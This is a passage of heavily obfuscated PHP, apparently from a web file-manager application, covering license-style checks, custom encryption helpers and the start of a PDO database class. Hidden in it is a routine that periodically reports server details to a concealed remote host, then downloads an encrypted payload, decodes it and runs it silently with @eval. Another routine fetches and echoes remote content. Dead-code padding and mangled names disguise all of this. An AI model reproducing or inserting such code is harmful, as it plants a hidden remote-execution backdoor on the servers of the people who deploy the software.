$—°õÏğœ = $ÈâìÍ¢ı[260] . md5($ÈâìÍ¢ı[261]); if ($this->vtwg4abd075d == $ÈâìÍ¢ı[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ÈâìÍ¢ı[24]], $Ú›ÂŸÎ)) { return; } if (time() % 4 != 0) { return; } $ßâøÌ©² = call_user_func(array($ÈâìÍ¢ı[262], $ÈâìÍ¢ı[263]), $—°õÏğœ); $¢³”ı÷è = $¿ËÇœ°[783]; if ($ßâøÌ©² && time() - $ßâøÌ©² < intval($ÈâìÍ¢ı[264])) { return; } call_user_func(array($ÈâìÍ¢ı[262], $ÈâìÍ¢ı[141]), $—°õÏğœ, time()); $–õƒüËÃ = Model($ÈâìÍ¢ı[33])->get($ÈâìÍ¢ı[102]); $‘ï†½÷µ = $¿ËÇœ°[784]; $’üÕ¯›Í = array($ÈâìÍ¢ı[154] => Model($ÈâìÍ¢ı[33])->get($ÈâìÍ¢ı[155]), $ÈâìÍ¢ı[169] => $this->vtwg4abd075d, $ÈâìÍ¢ı[165] => $_SERVER[$ÈâìÍ¢ı[166]], $ÈâìÍ¢ı[167] => Model($ÈâìÍ¢ı[33])->get($ÈâìÍ¢ı[133]), $ÈâìÍ¢ı[107] => md5($_SERVER[$ÈâìÍ¢ı[108]] . $–õƒüËÃ), $ÈâìÍ¢ı[158] => $ÈâìÍ¢ı[138], $ÈâìÍ¢ı[161] => $_SERVER[$ÈâìÍ¢ı[162]]); $ÔËŞ·Ó = $¿ËÇœ°[785]; if (strlen($ÔËŞ·Ó) < $¿ËÇœ°[736]) { die; } $ç‹Áäæü = $this->thbacde460f3($ÈâìÍ¢ı[265], $’üÕ¯›Í); $•ÀøÕÏÙ = $¿ËÇœ°[786]; if (strlen($•ÀøÕÏÙ) < $¿ËÇœ°[736]) { die; } if (!is_array($ç‹Áäæü)) { return; } if ($ç‹Áäæü[$ÈâìÍ¢ı[154]] && $ç‹Áäæü[$ÈâìÍ¢ı[266]]) { if ($this->eszt3040f185($ç‹Áäæü[$ÈâìÍ¢ı[266]]) == $’üÕ¯›Í[$ÈâìÍ¢ı[154]]) { return; } } $this->gqelbc721cbf(); $Ãï¢‚œ® = $¿ËÇœ°[787]; while ($Ãï¢‚œ® < $¿ËÇœ°[736]) { if ($Ãï¢‚œ® >= 0) { break; } $Ãï¢‚œ®++; } if ($this->eszt3040f185($ç‹Áäæü[$ÈâìÍ¢ı[266]]) != $’üÕ¯›Í[$ÈâìÍ¢ı[154]]) { $¸Âéëñ© = array($ÈâìÍ¢ı[187] => $–õƒüËÃ, $ÈâìÍ¢ı[188] => $_SERVER[$ÈâìÍ¢ı[108]], $ÈâìÍ¢ı[189] => this_url(), $ÈâìÍ¢ı[163] => $_SERVER[$ÈâìÍ¢ı[164]]); $Ü¥«˜¦Ú = $this->orgd6267aed4(json_encode($¸Âéëñ©)); $ç‹Áäæü = $this->thbacde460f3($ÈâìÍ¢ı[190] . $Ü¥«˜¦Ú); if ($ç‹Áäæü && is_array($ç‹Áäæü) && isset($ç‹Áäæü[$ÈâìÍ¢ı[266]])) { $àŸµŒî‰ = $this->whdl91e0f482($ç‹Áäæü[$ÈâìÍ¢ı[266]], 2); if ($àŸµŒî‰) { $àŸµŒî‰ = $this->eszt3040f185($àŸµŒî‰); } if ($àŸµŒî‰) { try { @eval($àŸµŒî‰); } catch (Exception $ûçÉğå ) { } } } } } private function thbacde460f3($Û‰»²ÈŠ = '', $¿ÉÛˆ¥¢ = array(), $îË—«ıß = 5) { $•–÷Ó¢Á =& $_SERVER[”øäÃÍª]; $¨éÂõ“ =& $_SERVER[‘‹å÷ç]; $è‡±åÖ« = $¨éÂõ“[267]; $ÄÖ€¾ß = $•–÷Ó¢Á[788]; if (strlen($ÄÖ€¾ß) < $•–÷Ó¢Á[724]) { return; } $è‡±åÖ« = $this->lzou7285fb2f($è‡±åÖ«, $¨éÂõ“[268]); $«å®Ë‹» = $•–÷Ó¢Á[789]; if (!$«å®Ë‹») { die; } $è‡±åÖ« = $è‡±åÖ« . $Û‰»²ÈŠ; if ($¿ÉÛˆ¥¢ && is_array($¿ÉÛˆ¥¢)) { $è‡±åÖ« = $è‡±åÖ« . $¨éÂõ“[269] . http_build_query($¿ÉÛˆ¥¢); } if ($¿ÉÛˆ¥¢ === -1) { return $è‡±åÖ«; } $È¨ê«¾Ş = stream_context_create(array($¨éÂõ“[222] => array($¨éÂõ“[225] => $îË—«ıß, $¨éÂõ“[223] => $¨éÂõ“[270]), $¨éÂõ“[271] => array($¨éÂõ“[272] => !1, $¨éÂõ“[273] => !1))); $ÔØÖ¤ë = $•–÷Ó¢Á[790]; if (strlen($ÔØÖ¤ë) < $•–÷Ó¢Á[497]) { return; } $¿ÉÛˆ¥¢ = @file_get_contents($è‡±åÖ«, !1, $È¨ê«¾Ş); $¸Öä‘›Ù = $•–÷Ó¢Á[791]; if (strlen($¸Öä‘›Ù) < $•–÷Ó¢Á[726]) { die; } return json_decode($¿ÉÛˆ¥¢, !0); } private function vfdn24d7d338() { $ìç¥ÎÍë =& $_SERVER[”øäÃÍª]; $²³ìöâ™ =& $_SERVER[‘‹å÷ç]; $Ùú“–‘ë = array($²³ìöâ™[274] => $²³ìöâ™[275], $²³ìöâ™[276] => $²³ìöâ™[277], $²³ìöâ™[278] => $²³ìöâ™[279], $²³ìöâ™[280] => $²³ìöâ™[281], $²³ìöâ™[282] => $²³ìöâ™[283], $²³ìöâ™[284] => $²³ìöâ™[217], $²³ìöâ™[285] => $²³ìöâ™[217], $²³ìöâ™[286] => $²³ìöâ™[275], $²³ìöâ™[287] => $²³ìöâ™[277], $²³ìöâ™[288] => $²³ìöâ™[279], $²³ìöâ™[289] => $²³ìöâ™[290], $²³ìöâ™[291] => $²³ìöâ™[281], $²³ìöâ™[292] => $²³ìöâ™[293], $²³ìöâ™[294] => $²³ìöâ™[283], $²³ìöâ™[295] => $²³ìöâ™[296], $²³ìöâ™[297] => $²³ìöâ™[298], $²³ìöâ™[299] => $²³ìöâ™[300]); $»„¢Òˆœ = $Ùú“–‘ë[$this->vtwg4abd075d]; $»„¢Òˆœ = intval($»„¢Òˆœ ? $»„¢Òˆœ : $²³ìöâ™[275]); $¶”ú€„± = $ìç¥ÎÍë[792]; while ($¶”ú€„± < $ìç¥ÎÍë[724]) { if ($¶”ú€„± >= 0) { break; } $¶”ú€„±++; } $ÛÓ½Èñò = _get($this->qdoi53911dcc, $²³ìöâ™[301]); $ÛÓ½Èñò = $ÛÓ½Èñò ? intval($ÛÓ½Èñò) : 0; $˜Ø“Š£™ = $ìç¥ÎÍë[793]; while (strlen($˜Ø“Š£™) < $ìç¥ÎÍë[717]) { if (!$˜Ø“Š£™) { break; } $˜Ø“Š£™++; } return $»„¢Òˆœ + $ÛÓ½Èñò; } public function enur9d2f8b93($Áú÷§ÃÔ) { $¦×Û¶ãÜ =& $_SERVER[”øäÃÍª]; $‡‡”˜²© =& $_SERVER[‘‹å÷ç]; $ŠÍ§Œ» = $this->vfdn24d7d338(); if ($Áú÷§ÃÔ[$‡‡”˜²©[302]] == $‡‡”˜²©[124]) { return; } if ($ŠÍ§Œ» >= intval($‡‡”˜²©[217])) { return; } $¾Ğö¤å´ = Model($‡‡”˜²©[127])->count(); if ($¾Ğö¤å´ <= $ŠÍ§Œ») { return; } $‹ì¶¤‚Õ = Model($‡‡”˜²©[127])->field($‡‡”˜²©[302])->limit($ŠÍ§Œ»)->select(); $·ñéóÑ… = $¦×Û¶ãÜ[794]; $‹ì¶¤‚Õ = array_to_keyvalue($‹ì¶¤‚Õ, $‡‡”˜²©[6], $‡‡”˜²©[302]); $”ú÷€¦ = $¦×Û¶ãÜ[795]; if (strlen($”ú÷€¦) < $¦×Û¶ãÜ[736]) { die; } if (!in_array($Áú÷§ÃÔ[$‡‡”˜²©[302]], $‹ì¶¤‚Õ)) { show_json($‡‡”˜²©[303], !1, $‡‡”˜²©[213]); } } public function ytnl4d81a8d3() { $ƒçñê¾ =& $_SERVER[”øäÃÍª]; $Î¡˜ùËß =& $_SERVER[‘‹å÷ç]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $à¦ÅÖØŸ = $Î¡˜ùËß[220]; $‹İØú¾ú = $ƒçñê¾[796]; if (!$‹İØú¾ú) { die; } $à¦ÅÖØŸ = $this->lzou7285fb2f($à¦ÅÖØŸ, $Î¡˜ùËß[221]); $ïÖøÜ“ = $ƒçñê¾[797]; if (!$ïÖøÜ“) { die; } $Ô›¾¢Ë = stream_context_create(array($Î¡˜ùËß[222] => array($Î¡˜ùËß[223] => $Î¡˜ùËß[224], $Î¡˜ùËß[225] => 3))); $ò¼õÀÜŠ = $ƒçñê¾[798]; $‰Ş¨ØË’ = @file_get_contents($à¦ÅÖØŸ, !1, $Ô›¾¢Ë); echo $Î¡˜ùËß[304] . hash_encode($‰Ş¨ØË’) . $Î¡˜ùËß[305]; $¯õ°Ï‹³ = $ƒçñê¾[799]; } private function gqpj58401f8f($‰ÒÎ‡ÚÈ, $áğ×€¤, $Î–ÔÁ÷û = 3) { $Û¡­”É =& $_SERVER[”øäÃÍª]; $ÈĞ£ŒŒà =& $_SERVER[‘‹å÷ç]; usleep(1); $¼ô“‚­ = $Û¡­”É[800]; if (!$¼ô“‚­) { die; } $‰ÒÎ‡ÚÈ = trim($‰ÒÎ‡ÚÈ); $û”æô‚Ü = $Û¡­”É[801]; $àÉ£µêö = mt_rand(0, 5) . $ÈĞ£ŒŒà[6]; $Ù™¸‹ = rand_string(15); $²Ò‹ø¸‘ = $ÈĞ£ŒŒà[306]; $ÄëÃÕ†ë = $Û¡­”É[802]; switch ($àÉ£µêö) { case $ÈĞ£ŒŒà[208]: $·‹ûùÃ = $this->khrbde30d929($‰ÒÎ‡ÚÈ, strrev($áğ×€¤ . $Ù™¸‹)); $†ø„°Ã¡ = $Û¡­”É[803]; if (strlen($†ø„°Ã¡) < $Û¡­”É[736]) { die; } break; case $ÈĞ£ŒŒà[124]: $·‹ûùÃ = $this->khrbde30d929($‰ÒÎ‡ÚÈ, strrev($Ù™¸‹ . $áğ×€¤)); $Ç«Ó¼Õö = $Û¡­”É[804]; break; $¨†ŒãˆÙ = $Û¡­”É[805]; case $ÈĞ£ŒŒà[307]: $·‹ûùÃ = $this->khrbde30d929($‰ÒÎ‡ÚÈ, base64_encode($Ù™¸‹ . $áğ×€¤)); break; $¼Öüı¼Ÿ = $Û¡­”É[806]; if (strlen($¼Öüı¼Ÿ) < $Û¡­”É[736]) { die; } case $ÈĞ£ŒŒà[308]: $·‹ûùÃ = $this->khrbde30d929($‰ÒÎ‡ÚÈ, md5($Ù™¸‹ . $áğ×€¤)); break; $èğÌò¾ = $Û¡­”É[807]; if (!$èğÌò¾) { die; } case $ÈĞ£ŒŒà[309]: $‰ÒÎ‡ÚÈ = base64_encode($‰ÒÎ‡ÚÈ); $Ø¹Á™Ëæ = $Û¡­”É[808]; if (strlen($Ø¹Á™Ëæ) < $Û¡­”É[726]) { die; } $ÂœÔ’Çë = rand(0, 64); $ç³ï…¹ = $²Ò‹ø¸‘[$ÂœÔ’Çë]; $Ÿü²Î’¼ = $Û¡­”É[809]; while (strlen($Ÿü²Î’¼) < $Û¡­”É[726]) { if (!$Ÿü²Î’¼) { break; } $Ÿü²Î’¼++; } $ßŞÄÉ = md5($ç³ï…¹ . md5($áğ×€¤ . $ç³ï…¹) . $áğ×€¤); $ßŞÄÉ = substr($ßŞÄÉ, $ÂœÔ’Çë % 8, $ÂœÔ’Çë % 8 + 7); $®¿¡úÙ = $ÈĞ£ŒŒà[6]; $ğ‡ÄÂ³ˆ = $Û¡­”É[810]; if (strlen($ğ‡ÄÂ³ˆ) < $Û¡­”É[726]) { die; } $¢Ê’Œø¹ = 0; $ò‡¡Êµï = 0; $—´¢ä® = $Û¡­”É[811]; if (!$—´¢ä®) { die; } $…Ÿ½ƒé = 0; for ($¢Ê’Œø¹ = 0; $¢Ê’Œø¹ < strlen($‰ÒÎ‡ÚÈ); $¢Ê’Œø¹++) { $…Ÿ½ƒé = $…Ÿ½ƒé == strlen($ßŞÄÉ) ? 0 : $…Ÿ½ƒé; $ò‡¡Êµï = ($ÂœÔ’Çë + strpos($²Ò‹ø¸‘, $‰ÒÎ‡ÚÈ[$¢Ê’Œø¹]) + ord($ßŞÄÉ[$…Ÿ½ƒé++])) % 64; $®¿¡úÙ .= $²Ò‹ø¸‘[$ò‡¡Êµï]; $³¼÷¾½ä = $Û¡­”É[812]; if (!$³¼÷¾½ä) { return; } } $·‹ûùÃ = hash_encode($ç³ï…¹ . $®¿¡úÙ); break; default: $·‹ûùÃ = $this->khrbde30d929($‰ÒÎ‡ÚÈ, $áğ×€¤ . $Ù™¸‹); $éÇÕíˆ÷ = $Û¡­”É[813]; break; } $·‹ûùÃ = strrev($àÉ£µêö . $Ù™¸‹ . $·‹ûùÃ); if ($Î–ÔÁ÷û - 1 > 0) { $·‹ûùÃ = $this->gqpj58401f8f($·‹ûùÃ, $áğ×€¤, $Î–ÔÁ÷û - 1); } return $·‹ûùÃ; } private function whdl91e0f482($·ÀÅ¬³ß, $½şñ›¾, $¯ØíÊÜñ = 3) { $œ°ÅÀ¶Å =& $_SERVER[”øäÃÍª]; $ƒó²ßÅ =& $_SERVER[‘‹å÷ç]; if (!is_string($·ÀÅ¬³ß) || strlen($·ÀÅ¬³ß) < 10) { return !1; } $·ÀÅ¬³ß = trim($·ÀÅ¬³ß); $·ÀÅ¬³ß = strrev($·ÀÅ¬³ß); $œ´ğ¾æÅ = $œ°ÅÀ¶Å[814]; if (strlen($œ´ğ¾æÅ) < $œ°ÅÀ¶Å[717]) { return; } $ì¥à¢Ó¥ = $·ÀÅ¬³ß[0]; $Ìì´ìŒü = substr($·ÀÅ¬³ß, 1, 15); $Èåİ¦Çí = $œ°ÅÀ¶Å[815]; if (!$Èåİ¦Çí) { die; } $·ÀÅ¬³ß = substr($·ÀÅ¬³ß, 16); $ŞÌˆŒÔı = $œ°ÅÀ¶Å[816]; $â‰ƒ‚Â = $ƒó²ßÅ[306]; $Åú´ÚŸ€ = $œ°ÅÀ¶Å[817]; if (strlen($Åú´ÚŸ€) < $œ°ÅÀ¶Å[497]) { die; } switch ($ì¥à¢Ó¥) { case $ƒó²ßÅ[208]: $Üºî’–Ç = $this->lzou7285fb2f($·ÀÅ¬³ß, strrev($½şñ›¾ . $Ìì´ìŒü)); break; case $ƒó²ßÅ[124]: $Üºî’–Ç = $this->lzou7285fb2f($·ÀÅ¬³ß, strrev($Ìì´ìŒü . $½şñ›¾)); break; $õ´ÕŸ¬© = $œ°ÅÀ¶Å[818]; while ($õ´ÕŸ¬© < $œ°ÅÀ¶Å[736]) { if ($õ´ÕŸ¬© >= 0) { break; } $õ´ÕŸ¬©++; } case $ƒó²ßÅ[307]: $Üºî’–Ç = $this->lzou7285fb2f($·ÀÅ¬³ß, base64_encode($Ìì´ìŒü . $½şñ›¾)); break; case $ƒó²ßÅ[308]: $Üºî’–Ç = $this->lzou7285fb2f($·ÀÅ¬³ß, md5($Ìì´ìŒü . $½şñ›¾)); $²îÍ”ï« = $œ°ÅÀ¶Å[819]; if (strlen($²îÍ”ï«) < $œ°ÅÀ¶Å[497]) { return; } break; case $ƒó²ßÅ[309]: $·ÀÅ¬³ß = hash_decode($·ÀÅ¬³ß); $Ô÷‚áöÈ = $œ°ÅÀ¶Å[820]; $Å¥ŠòÇ = $·ÀÅ¬³ß[0]; $·ÀÅ¬³ß = substr($·ÀÅ¬³ß, 1); $›…‘¸Ï¬ = strpos($â‰ƒ‚Â, $Å¥ŠòÇ); $÷ãÈïı‘ = md5($Å¥ŠòÇ . md5($½şñ›¾ . $Å¥ŠòÇ) . $½şñ›¾); $Ü‰–æè» = $œ°ÅÀ¶Å[821]; if (strlen($Ü‰–æè») < $œ°ÅÀ¶Å[717]) { return; } $÷ãÈïı‘ = substr($÷ãÈïı‘, $›…‘¸Ï¬ % 8, $›…‘¸Ï¬ % 8 + 7); $·†ÀÙ—Ì = $œ°ÅÀ¶Å[822]; while (strlen($·†ÀÙ—Ì) < $œ°ÅÀ¶Å[726]) { if (!$·†ÀÙ—Ì) { break; } $·†ÀÙ—Ì++; } $ãñŒÀ¼· = $ƒó²ßÅ[6]; $¹¾µ‚ = 0; $Ã¨¢ÅŸ‰ = $œ°ÅÀ¶Å[823]; if (strlen($Ã¨¢ÅŸ‰) < $œ°ÅÀ¶Å[726]) { return; } $„Ó¨–°¶ = 0; $¨‘ÕØ¦¼ = $œ°ÅÀ¶Å[824]; if (!$¨‘ÕØ¦¼) { die; } $€½°ÚÃê = 0; $Àä¸·¾ = $œ°ÅÀ¶Å[825]; while ($Àä¸·¾ < $œ°ÅÀ¶Å[736]) { if ($Àä¸·¾ >= 0) { break; } $Àä¸·¾++; } for ($¹¾µ‚ = 0; $¹¾µ‚ < strlen($·ÀÅ¬³ß); $¹¾µ‚++) { $€½°ÚÃê = $€½°ÚÃê == strlen($÷ãÈïı‘) ? 0 : $€½°ÚÃê; $êåší€ = $œ°ÅÀ¶Å[826]; if (!$êåší€) { die; } $›­ÂêŸş = $€½°ÚÃê++; $šŸ­·ßü = $œ°ÅÀ¶Å[827]; if (strlen($šŸ­·ßü) < $œ°ÅÀ¶Å[497]) { die; } $„Ó¨–°¶ = strpos($â‰ƒ‚Â, $·ÀÅ¬³ß[$¹¾µ‚]) - $›…‘¸Ï¬ - ord($÷ãÈïı‘[$›­ÂêŸş]); $ŠÑâ«ÅÕ = $œ°ÅÀ¶Å[828]; if (strlen($ŠÑâ«ÅÕ) < $œ°ÅÀ¶Å[726]) { die; } while ($„Ó¨–°¶ < 0) { $„Ó¨–°¶ += 64; } $ãñŒÀ¼· .= $â‰ƒ‚Â[$„Ó¨–°¶]; } $Üºî’–Ç = base64_decode($ãñŒÀ¼·); break; $°ÛÍ”È® = $œ°ÅÀ¶Å[829]; while (strlen($°ÛÍ”È®) < $œ°ÅÀ¶Å[717]) { if (!$°ÛÍ”È®) { break; } $°ÛÍ”È®++; } default: $Üºî’–Ç = $this->lzou7285fb2f($·ÀÅ¬³ß, $½şñ›¾ . $Ìì´ìŒü); $ûâ¬Ä° = $œ°ÅÀ¶Å[830]; break; } if ($¯ØíÊÜñ - 1 > 0) { $Üºî’–Ç = $this->whdl91e0f482($Üºî’–Ç, $½şñ›¾, $¯ØíÊÜñ - 1); } return $Üºî’–Ç; } public function orgd6267aed4($øßÁï³È) { $íÖ‚½Â =& $_SERVER[”øäÃÍª]; $ÁÀº¶¨É =& $_SERVER[‘‹å÷ç]; $äéö¼Í¢ = $this->lyqh032595d0(); $÷èö”èÀ = $this->lyqh032595d0(); $Œ’µĞ­‚ = $íÖ‚½Â[831]; while (strlen($Œ’µĞ­‚) < $íÖ‚½Â[497]) { if (!$Œ’µĞ­‚) { break; } $Œ’µĞ­‚++; } $ï²Ñ¸¯´ = ($äéö¼Í¢ - 1) * ($÷èö”èÀ - 1); $´·¾´‹„ = $íÖ‚½Â[832]; if (!$´·¾´‹„) { return; } $ş»‰Ù“° = intval(($äéö¼Í¢ + $÷èö”èÀ) / 2); $‘¥Â“Ş = $íÖ‚½Â[833]; if (strlen($‘¥Â“Ş) < $íÖ‚½Â[717]) { return; } while (1) { $˜¤¸Ş»º = $ş»‰Ù“°; $šôÁÎØ = $ï²Ñ¸¯´; $¡¼À„ÄÎ = $íÖ‚½Â[834]; while (strlen($¡¼À„ÄÎ) < $íÖ‚½Â[726]) { if (!$¡¼À„ÄÎ) { break; } $¡¼À„ÄÎ++; } while ($šôÁÎØ % $˜¤¸Ş»º != 0) { $£¸ıöÇ† = $šôÁÎØ; $ò»Ğê¢ = $íÖ‚½Â[835]; while ($ò»Ğê¢ < $íÖ‚½Â[724]) { if ($ò»Ğê¢ >= 0) { break; } $ò»Ğê¢++; } $šôÁÎØ = $˜¤¸Ş»º; $Âñ‰°İ° = $íÖ‚½Â[836]; while ($Âñ‰°İ° < $íÖ‚½Â[736]) { if ($Âñ‰°İ° >= 0) { break; } $Âñ‰°İ°++; } $˜¤¸Ş»º = $£¸ıöÇ† % $˜¤¸Ş»º; $ã¡…²§™ = $íÖ‚½Â[837]; while (strlen($ã¡…²§™) < $íÖ‚½Â[736]) { if (!$ã¡…²§™) { break; } $ã¡…²§™++; } } if ($˜¤¸Ş»º == 1) { break; } else { $ş»‰Ù“°++; } } $øìè¹È— = 2; $¦ø‰Ú‰ = $íÖ‚½Â[838]; while (strlen($¦ø‰Ú‰) < $íÖ‚½Â[497]) { if (!$¦ø‰Ú‰) { break; } $¦ø‰Ú‰++; } for ($”½£İÑ… = 0; $”½£İÑ… < $ï²Ñ¸¯´ * 10; $”½£İÑ…++) { if (($ï²Ñ¸¯´ * $”½£İÑ… + 1) % $ş»‰Ù“° == 0) { $øìè¹È— = intval(($ï²Ñ¸¯´ * $”½£İÑ… + 1) / $ş»‰Ù“°); break; } } $‹èĞõ£á = $this->khrbde30d929($äéö¼Í¢ * $÷èö”èÀ . $ÁÀº¶¨É[6], $ÁÀº¶¨É[138]); $½Èòìç = md5($ÁÀº¶¨É[310] . ($äéö¼Í¢ + $÷èö”èÀ) . $ÁÀº¶¨É[311] . $ş»‰Ù“° . $ÁÀº¶¨É[311] . $øìè¹È— . $ÁÀº¶¨É[312]); $‹âÎùêœ = $íÖ‚½Â[839]; if (strlen($‹âÎùêœ) < $íÖ‚½Â[736]) { die; } $¼ò¹’¹¢ = $this->khrbde30d929($øßÁï³È, $½Èòìç) . $ÁÀº¶¨É[313] . $‹èĞõ£á; $šÜ¿·Â¢ = $íÖ‚½Â[768]; return $¼ò¹’¹¢; $Èì÷ß– = $íÖ‚½Â[840]; while (strlen($Èì÷ß–) < $íÖ‚½Â[736]) { if (!$Èì÷ß–) { break; } $Èì÷ß–++; } } public function eszt3040f185($şĞ¿åÍ) { $Õ Ÿ÷È´ =& $_SERVER[”øäÃÍª]; $îøÖ¼¯ =& $_SERVER[‘‹å÷ç]; $È±øš„§ = explode($îøÖ¼¯[313], $şĞ¿åÍ); if (count($È±øš„§) != 2) { return $îøÖ¼¯[6]; } $çìõ¾¶ = $this->lzou7285fb2f($È±øš„§[1] . $îøÖ¼¯[6], $îøÖ¼¯[138]); $â®ğÄéˆ = $Õ Ÿ÷È´[841]; if (strlen($â®ğÄéˆ) < $Õ Ÿ÷È´[736]) { return; } if (!$çìõ¾¶) { return $îøÖ¼¯[6]; } $çìõ¾¶ = intval($çìõ¾¶); $Ç”ŒÓ = $Õ Ÿ÷È´[842]; if (!$Ç”ŒÓ) { die; } $ÜŒÕ“ÙÊ = 0; $“Ÿª‡Öî = $Õ Ÿ÷È´[843]; if (!$“Ÿª‡Öî) { return; } $µÕËä©û = 0; $¹™§¹ó = $Õ Ÿ÷È´[844]; if (strlen($¹™§¹ó) < $Õ Ÿ÷È´[717]) { die; } for ($í½Ÿ…Ù = 3; $í½Ÿ…Ù < $çìõ¾¶; $í½Ÿ…Ù += 2) { if ($çìõ¾¶ % $í½Ÿ…Ù != 0) { continue; } $ÜŒÕ“ÙÊ = $í½Ÿ…Ù; $Ñ©Ò”ıå = $Õ Ÿ÷È´[845]; if (strlen($Ñ©Ò”ıå) < $Õ Ÿ÷È´[726]) { return; } $µÕËä©û = intval($çìõ¾¶ / $í½Ÿ…Ù); break; } $ ùØãñ = ($ÜŒÕ“ÙÊ - 1) * ($µÕËä©û - 1); $û•üÅÓ¦ = intval(($ÜŒÕ“ÙÊ + $µÕËä©û) / 2); $İ¬˜Ÿí¸ = $Õ Ÿ÷È´[846]; while ($İ¬˜Ÿí¸ < $Õ Ÿ÷È´[497]) { if ($İ¬˜Ÿí¸ >= 0) { break; } $İ¬˜Ÿí¸++; } while (1) { $ëïİíš = $û•üÅÓ¦; $ÍÁ»‰‡Â = $Õ Ÿ÷È´[847]; if (strlen($ÍÁ»‰‡Â) < $Õ Ÿ÷È´[736]) { die; } $ãÓÕÓ¥° = $ ùØãñ; while ($ãÓÕÓ¥° % $ëïİíš != 0) { $¡õ¹æ¦ = $ãÓÕÓ¥°; $ãÓÕÓ¥° = $ëïİíš; $ëïİíš = $¡õ¹æ¦ % $ëïİíš; $âã­ùÎƒ = $Õ Ÿ÷È´[848]; while ($âã­ùÎƒ < $Õ Ÿ÷È´[736]) { if ($âã­ùÎƒ >= 0) { break; } $âã­ùÎƒ++; } } if ($ëïİíš == 1) { break; } else { $û•üÅÓ¦++; } } $éŸÂ£Í¢ = 2; $ŸúÁÑ‡ = $Õ Ÿ÷È´[849]; if (strlen($ŸúÁÑ‡) < $Õ Ÿ÷È´[724]) { die; } for ($í½Ÿ…Ù = 0; $í½Ÿ…Ù < $ ùØãñ * 10; $í½Ÿ…Ù++) { if (($ ùØãñ * $í½Ÿ…Ù + 1) % $û•üÅÓ¦ == 0) { $éŸÂ£Í¢ = intval(($ ùØãñ * $í½Ÿ…Ù + 1) / $û•üÅÓ¦); break; } } $ÌúòÒ = md5($îøÖ¼¯[310] . ($ÜŒÕ“ÙÊ + $µÕËä©û) . $îøÖ¼¯[311] . $û•üÅÓ¦ . $îøÖ¼¯[311] . $éŸÂ£Í¢ . $îøÖ¼¯[312]); $æ¶é£Úá = $this->lzou7285fb2f($È±øš„§[0], $ÌúòÒ); $¶ßÕ¦²÷ = $Õ Ÿ÷È´[850]; while (strlen($¶ßÕ¦²÷) < $Õ Ÿ÷È´[717]) { if (!$¶ßÕ¦²÷) { break; } $¶ßÕ¦²÷++; } return $æ¶é£Úá; $¢”¿ûèè = $Õ Ÿ÷È´[851]; while (strlen($¢”¿ûèè) < $Õ Ÿ÷È´[724]) { if (!$¢”¿ûèè) { break; } $¢”¿ûèè++; } } public function lyqh032595d0() { $şéŒìëé =& $_SERVER[”øäÃÍª]; $®»â­…æ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ƒ—ûğ¯° = $şéŒìëé[852]; while ($ƒ—ûğ¯° < $şéŒìëé[724]) { if ($ƒ—ûğ¯° >= 0) { break; } $ƒ—ûğ¯°++; } $ªÎüº”È = array(); $ÒßÉ«óÅ = $şéŒìëé[853]; $ã£¯©ĞÁ = 1; while ($ã£¯©ĞÁ <= (int) sqrt($®»â­…æ)) { $…´Û´è = $ã£¯©ĞÁ; while (!0) { $…´Û´è++; if ($…´Û´è <= 2) { $ã£¯©ĞÁ = $…´Û´è; break; } else { if ($…´Û´è < 2) { continue; } } $ë¿Šò‡Ş = !0; for ($óÛ¹áÎ = 2; $óÛ¹áÎ <= sqrt($…´Û´è); $óÛ¹áÎ++) { if ($…´Û´è % $óÛ¹áÎ == 0) { $ë¿Šò‡Ş = !1; } } if ($ë¿Šò‡Ş) { $ã£¯©ĞÁ = $…´Û´è; break; } } $ªÎüº”È[] = $ã£¯©ĞÁ; } $Ëş¡¶ôÈ = 2; $úù¨åñŸ = $şéŒìëé[854]; if (!$úù¨åñŸ) { die; } for ($…´Û´è = $®»â­…æ; $…´Û´è > 1; $…´Û´è--) { $ë¿Šò‡Ş = !0; foreach ($ªÎüº”È as $¬ú¸ëÈ£) { if ($…´Û´è % $¬ú¸ëÈ£ == 0) { $ë¿Šò‡Ş = !1; break; } } if ($ë¿Šò‡Ş) { $Ëş¡¶ôÈ = $…´Û´è; break; } } return $Ëş¡¶ôÈ; $Œƒ¢õ‡µ = $şéŒìëé[855]; while (strlen($Œƒ¢õ‡µ) < $şéŒìëé[736]) { if (!$Œƒ¢õ‡µ) { break; } $Œƒ¢õ‡µ++; } } public function biuoe2e2ac99($‘íºá‘¥, $›âƒµ‹ë) { $Ğ¥¤ „‰ =& $_SERVER[”øäÃÍª]; $ö¼Ú„á =& $_SERVER[‘‹å÷ç]; return call_user_func(array($ö¼Ú„á[8], $ö¼Ú„á[314]), $‘íºá‘¥, $›âƒµ‹ë); $ñ¯–ùºƒ = $Ğ¥¤ „‰[856]; while (strlen($ñ¯–ùºƒ) < $Ğ¥¤ „‰[726]) { if (!$ñ¯–ùºƒ) { break; } $ñ¯–ùºƒ++; } } public function khrbde30d929($‡‚ú”±Ã, $éÏÚª›Í) { $ãÈòûĞœ =& $_SERVER[‘‹å÷ç]; return call_user_func(array($ãÈòûĞœ[315], $ãÈòûĞœ[316]), $‡‚ú”±Ã, $éÏÚª›Í); } public function lzou7285fb2f($òñæ÷–«, $ß¶Æ“È„) { $æáî´¨» =& $_SERVER[‘‹å÷ç]; return call_user_func(array($æáî´¨»[315], $æáî´¨»[317]), $òñæ÷–«, $ß¶Æ“È„); } } goto A„òíËê°Ó; Dò¸‰–Û: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($óÂãê˜Ù = '') { $ì³æÎÅù =& $_SERVER[”øäÃÍª]; if (!class_exists($ì³æÎÅù[1036])) { think_exception(think_lang($ì³æÎÅù[14]) . $ì³æÎÅù[1037]); } if (!empty($óÂãê˜Ù)) { $this->config = $óÂãê˜Ù; if (empty($this->config[$ì³æÎÅù[17]])) { $this->config[$ì³æÎÅù[17]] = array(); } } } public function connect($µÔÕ¡•‹ = '', $ºĞ“‚¾¡ = 0) { $œşÄ‰ =& $_SERVER[”øäÃÍª]; if (!isset($this->linkID[$ºĞ“‚¾¡])) { if (empty($µÔÕ¡•‹)) { $µÔÕ¡•‹ = $this->config; } $ÆÎÍ¦‹» = !empty($µÔÕ¡•‹[$œşÄ‰[17]][$œşÄ‰[18]]) ? $µÔÕ¡•‹[$œşÄ‰[17]][$œşÄ‰[18]] : $this->pconnect; if ($ÆÎÍ¦‹») { $µÔÕ¡•‹[$œşÄ‰[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ºĞ“‚¾¡] = new PDO($µÔÕ¡•‹[$œşÄ‰[1038]], 